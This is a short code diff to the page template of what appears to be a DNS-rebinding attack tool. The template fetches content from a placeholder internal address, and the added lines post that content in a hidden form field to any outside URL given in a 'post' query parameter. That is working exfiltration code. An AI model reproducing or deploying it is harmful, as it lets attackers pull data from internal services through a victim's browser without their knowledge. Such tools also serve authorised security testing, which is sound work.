@@ -40,6 +40,24 @@ async function run() {
 
     log("Contents of {rebind_scheme}://{rebind_address}:{rebind_port}/{rebind_path}:");
     log(resp);
+
+    // If we have a `post` quer string parameter, post the response to the given url
+    let urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.has('post')) {
+      let form = document.createElement("form");
+      let data_element = document.createElement("input");
+
+      form.method = 'POST';
+      form.action = urlParams.get('post') + window.location.search;
+
+      data_element.value = resp;
+      data_element.name = 'data';
+      data_element.type = 'hidden';
+      form.appendChild(data_element);
+
+      document.body.appendChild(form);
+      form.submit();
+    }
   }
   catch(e) {
     log("Retrying...");
